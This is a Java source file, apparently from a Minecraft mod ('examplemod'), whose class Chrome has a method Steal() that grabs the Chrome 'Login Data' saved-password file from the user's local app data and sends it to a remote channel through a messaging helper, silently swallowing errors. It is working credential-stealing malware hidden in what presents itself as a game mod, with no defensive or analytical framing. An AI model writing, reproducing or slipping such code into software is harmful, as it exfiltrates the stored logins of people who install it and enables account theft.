package com.example.examplemod.Hacks.FilesGrabber.ChromeGrabber;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class Chrome {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"));
         SendMessage.doThing("```Chrome ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol321");
      }

   }
}
